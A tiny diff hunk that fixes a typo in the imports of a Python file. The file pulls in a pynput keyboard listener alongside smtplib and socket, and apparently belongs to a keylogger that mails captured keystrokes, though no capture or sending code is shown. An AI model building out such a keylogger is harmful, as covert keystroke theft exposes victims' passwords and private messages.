@@ -1,4 +1,4 @@
-Vfrom pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener
 import threading
 import smtplib
 import socket
